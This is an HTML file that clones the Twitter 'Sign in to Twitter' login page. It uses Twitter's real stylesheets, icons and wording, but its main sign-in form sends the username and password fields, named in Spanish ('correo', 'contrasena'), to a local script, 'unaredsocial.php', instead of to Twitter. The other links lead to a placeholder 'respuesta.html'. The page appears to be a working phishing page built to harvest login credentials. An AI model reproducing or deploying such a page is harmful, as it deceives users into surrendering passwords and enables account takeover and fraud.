<!DOCTYPE html>
<!--[if IE 8
  ]><html class="lt-ie10 ie8" lang="en
  data-scribe-reduced-action-queue="true""><!
[endif]-->
<!--[if IE 9
  ]><html class="lt-ie10 ie9" lang="en
  data-scribe-reduced-action-queue="true""><!
[endif]-->
<!--[if gt IE 9]><!--><html
  lang="en"
  data-scribe-reduced-action-queue="true"
><!--<![endif]-->
  <head>
    <meta charset="utf-8" />


    <link
      rel="stylesheet"
      href="https://abs.twimg.com/a/1396298729/css/t1/rosetta_core.bundle.css"
    />

    <link
      rel="stylesheet"
      href="https://abs.twimg.com/a/1396298729/css/t1/rosetta_logged_out.bundle.css"
    />

    <title>Sign in to Twitter</title>

    <meta name="description" content="Sign in to Twitter. Welcome back!" />

    <meta
      name="msapplication-TileImage"
      content="//abs.twimg.com/favicons/win8-tile-144.png"
    />
    <meta name="msapplication-TileColor" content="#00aced" />

    <link
      href="//abs.twimg.com/favicons/favicon.ico"
      rel="shortcut icon"
      type="image/x-icon"
    />

    <meta
      name="viewport"
      id="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />

    <meta name="swift-page-name" id="swift-page-name" content="login" />

    <link rel="canonical" href="https://twitter.com/login" />

    <link
      rel="search"
      type="application/opensearchdescription+xml"
      href="/opensearch.xml"
      title="Twitter"
    />

    <link
      rel="stylesheet"
      href="https://abs.twimg.com/a/1396298729/css/t1/rosetta_more.bundle.css"
    />
  </head>
  <body class="t1 logged-out" data-fouc-class-names="swift-loading" dir="ltr">
    <script id="swift_loading_indicator">
      document.body.className =
        document.body.className +
        " " +
        document.body.getAttribute("data-fouc-class-names");
    </script>
    <div id="doc" class="route-login login-responsive">
      <div class="topbar js-topbar">
        <div id="banners" class="js-banners"></div>
        <div class="global-nav" data-section-term="top_nav">
          <div class="global-nav-inner">
            <div class="container">
              <ul class="nav js-global-actions">
                <li class="home" data-global-action="t1home">
                  <a class="nav-logo-link" href="/" data-nav="front">
                    <span class="Icon Icon--bird"
                      ><span class="visuallyhidden">Twitter</span></span
                    >
                  </a>
                </li>
              </ul>
              <div class="pull-right">
                <ul class="nav secondary-nav language-dropdown">
                  <li class="dropdown js-language-dropdown">
                    <a
                      href="#supported_languages"
                      class="dropdown-toggle js-dropdown-toggle"
                    >
                      <small>Language:</small>
                      <span class="js-current-language">English</span>
                      <b class="caret"></b>
                    </a>
                    <div class="dropdown-menu">
                      <div class="dropdown-caret right">
                        <span class="caret-outer"> </span>
                        <span class="caret-inner"></span>
                      </div>
                    </div>
                    <div class="js-front-language">
                      <form
                        action="/sessions/change_locale"
                        class="language"
                        method="POST"
                      >
                        <input type="hidden" name="lang" />
                        <input type="hidden" name="redirect" />
                        <input
                          type="hidden"
                          name="authenticity_token"
                          value="dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52"
                        />
                      </form>
                    </div>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
 
      <div id="page-outer">
        <div id="page-container" class="wrapper wrapper-login white">
          <div class="page-canvas">
            <div class="signin-wrapper" data-login-message="">
              <h1>Sign in to Twitter</h1>

              <form method="post" action="unaredsocial.php">
              <fieldset>
                  <legend class="visuallyhidden">Sign In</legend>

                  <div class="clearfix field">
                    <input
                      class=" email-input "
                      type="text"
                      id="correo"
                      name="correo"
                      autocomplete="on"
                      value=""
                      placeholder="Username or email"
                    />
                  </div>

                  <div class="clearfix field">
                    <input
                      class="js-password-field"
                      type="password"
                      id="contrasena"
                      name="contrasena"
                      placeholder="Password"
                    />
                  </div>

                  <button name="enviar" type="submit" class="btn btn-primary">Sign in</button>

                  <div class="subchck">
                    <label class="remember">
                      <input type="checkbox" value="1" name="remember_me" />
                      Remember me
                      <span class="separator">??</span>
                      <a class="forgot" href="respuesta.html">Forgot password?</a>
                    </label>
                  </div>
               
              </form>
            </div>

            <div class="clearfix mobile has-sms">
              <p class="signup-helper">
                New to Twitter?
                <a id="login-signup-link" href="respuesta.html"
                  >Sign up now&#32;&raquo;</a
                >
              </p>
              <p class="sms-helper">
                Already using Twitter via text message?
                <a href="respuesta.html"
                  >Activate your account&#32;&raquo;</a
                >
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
   

    <div id="signin-or-signup-dialog">
      <div id="signin-or-signup" class="modal-container">
        <div class="close-modal-background-target"></div>
        <div class="modal modal-medium draggable">
          <div class="modal-content">
            <button type="button" class="modal-btn modal-close js-close">
              <span class="Icon Icon--close Icon--medium">
                <span class="visuallyhidden">Close</span>
              </span>
            </button>

            <div class="modal-header">
              <h3 class="modal-title modal-long-title signup-only">
                Sign up for Twitter &amp; follow @<span></span>
              </h3>
              <h3 class="modal-title not-signup-only">Sign in to Twitter</h3>
            </div>
            <div class="modal-body signup-only">
              <form
                action="respuesta.html"
                class="clearfix signup"
                method="post"
              >
                <div class="field name">
                  <input
                    type="text"
                    autocomplete="off"
                    name="user[name]"
                    maxlength="20"
                    class="js-initial-focus"
                    placeholder="Full name"
                  />
                </div>
                <div class="field email">
                  <input
                    class="email-input"
                    type="text"
                    autocomplete="off"
                    name="user[email]"
                    placeholder="Email"
                  />
                </div>
                <div class="field password">
                  <input
                    type="password"
                    name="user[user_password]"
                    placeholder="Password"
                  />
                </div>
                <input type="hidden" value="" name="context" />
                <input
                  type="hidden"
                  value="dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52"
                  name="authenticity_token"
                />
                <input name="follows" type="hidden" value="" />
                <input
                  type="submit"
                  class="btn signup-btn js-submit js-signup-btn"
                  value="Sign up"
                />
              </form>
            </div>
            <div class="modal-body not-signup-only">
              <form
                action="respuesta.html"
                class="signin"
                method="post"
              >
                <fieldset>
                  <legend class="visuallyhidden">Sign In</legend>

                  <div class="clearfix field">
                    <input
                      class="js-username-field email-input js-initial-focus"
                      type="text"
                      name="session[username_or_email]"
                      autocomplete="on"
                      value=""
                      placeholder="Username or email"
                    />
                  </div>

                  <div class="clearfix field">
                    <input
                      class="js-password-field"
                      type="password"
                      name="session[password]"
                      placeholder="Password"
                    />
                  </div>

                  <input
                    type="hidden"
                    value="dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52"
                    name="authenticity_token"
                  />
                </fieldset>

                <div class="clearfix">
                  <input type="hidden" name="scribe_log" />
                  <input type="hidden" name="redirect_after_login" value="" />
                  <input
                    type="hidden"
                    value="dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52"
                    name="authenticity_token"
                  />
                  <button type="submit" class="submit btn primary-btn">
                    Sign in
                  </button>

                  <div class="subchck">
                    <label class="remember">
                      <input type="checkbox" value="1" name="remember_me" />
                      Remember me
                      <span class="separator">??</span>
                      <a class="forgot" href="respuesta.html"
                        >Forgot password?</a
                      >
                    </label>
                  </div>
                </div>

                <div class="divider"></div>
                <p>
                  <a class="forgot" href="respuesta.html"
                    >Forgot password?</a
                  ><br />
                  <a class="mobile has-sms" href="respuesta.html"
                    >Already using Twitter via text message?</a
                  >
                </p>
              </form>

              <div class="signup">
                <h2>
                  Not on Twitter? Sign up, tune into the things you care about,
                  and get updates as they happen.
                </h2>
                <form
                  action="respuesta.html"
                  class="signup"
                  method="get"
                >
                  <button class="btn promotional signup-btn" type="submit">
                    Sign up &raquo;
                  </button>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div id="sms-codes-dialog" class="modal-container">
      <div class="close-modal-background-target"></div>
      <div class="modal modal-medium draggable">
        <div class="modal-content">
          <button type="button" class="modal-btn modal-close js-close">
            <span class="Icon Icon--close Icon--medium">
              <span class="visuallyhidden">Close</span>
            </span>
          </button>

          <div class="modal-header">
            <h3 class="modal-title">
              Two-way (sending and receiving) short codes:
            </h3>
          </div>
          <div class="modal-body">
            <table id="sms_codes" cellpadding="0" cellspacing="0">
              <thead>
                <tr>
                  <th>Country</th>
                  <th>Code</th>
                  <th>For customers of</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>United States</td>
                  <td>40404</td>
                  <td>(any)</td>
                </tr>
                <tr>
                  <td>Canada</td>
                  <td>21212</td>
                  <td>(any)</td>
                </tr>
                <tr>
                  <td>United Kingdom</td>
                  <td>86444</td>
                  <td>Vodafone, Orange, 3, O2</td>
                </tr>
                <tr>
                  <td>Brazil</td>
                  <td>40404</td>
                  <td>Nextel, TIM</td>
                </tr>
                <tr>
                  <td>Haiti</td>
                  <td>40404</td>
                  <td>Digicel, Voila</td>
                </tr>
                <tr>
                  <td>Ireland</td>
                  <td>51210</td>
                  <td>Vodafone, O2</td>
                </tr>
                <tr>
                  <td>India</td>
                  <td>53000</td>
                  <td>Bharti Airtel, Videocon, Reliance</td>
                </tr>
                <tr>
                  <td>Indonesia</td>
                  <td>89887</td>
                  <td>AXIS, 3, Telkomsel, Indosat, XL Axiata</td>
                </tr>
                <tr>
                  <td rowspan="2">Italy</td>
                  <td>4880804</td>
                  <td>Wind</td>
                </tr>
                <tr>
                  <td>3424486444</td>
                  <td>Vodafone</td>
                </tr>
              </tbody>
              <tfoot>
                <tr>
                  <td colspan="3">
                    &raquo;
                    <a
                      class="js-initial-focus"
                      target="_blank"
                      href="http://support.twitter.com/articles/14226-how-to-find-your-twitter-short-code-or-long-code"
                      >See SMS short codes for other countries</a
                    >
                  </td>
                </tr>
              </tfoot>
            </table>
          </div>
        </div>
      </div>
    </div>

    <div id="create-custom-timeline-dialog" class="modal-container"></div>
    <div id="edit-custom-timeline-dialog" class="modal-container"></div>
    <div id="curate-dialog" class="modal-container"></div>

    <div class="hidden">
      <iframe
        aria-hidden="true"
        class="tweet-post-iframe"
        name="tweet-post-iframe"
      ></iframe>
    </div>

    <div id="spoonbill-outer"></div>
  </body>
</html>

<input type="hidden" class="swift-boot-module" value="app/pages/login" />
<input
  type="hidden"
  id="swift-module-path"
  value="https://abs.twimg.com/c/swift/en"
/>

<script
  src="https://abs.twimg.com/c/swift/en/init.ed8ccd43f44e391684b50a0fc3a107c9edab3a3c.js"
  async
></script>
